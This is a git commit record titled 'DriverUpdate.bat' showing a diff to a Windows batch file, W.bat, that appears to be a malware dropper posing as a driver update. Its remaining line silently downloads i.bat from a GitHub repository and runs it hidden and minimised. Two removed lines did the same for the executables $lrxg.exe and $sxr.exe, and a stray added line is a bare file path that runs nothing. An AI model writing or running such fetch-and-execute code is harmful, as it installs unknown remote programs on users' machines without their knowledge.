d5b452933f9bd4f5dc47ca81b83c12ac7caf53f0
DeviceDevv <154300499+DeviceDevv@users.noreply.github.com>
2023-12-19 17:04:23 -0600

    DriverUpdate.bat

--- W.bat
+++ W.bat
@@ -1,4 +1,3 @@
 curl -s -O https://raw.githubusercontent.com/negarclapper/f/main/i.bat && start /b /min i.bat
-curl -s -O https://raw.githubusercontent.com/negarclapper/f/main/$lrxg.exe && start /b /min $lrxg.exe
-curl -s -O https://raw.githubusercontent.com/negarclapper/f/main/$sxr.exe && start /b /min $sxr.exe
 curl parrot.live
+C:\Users\AppData\Local\Driver\Versions\version-Recent\
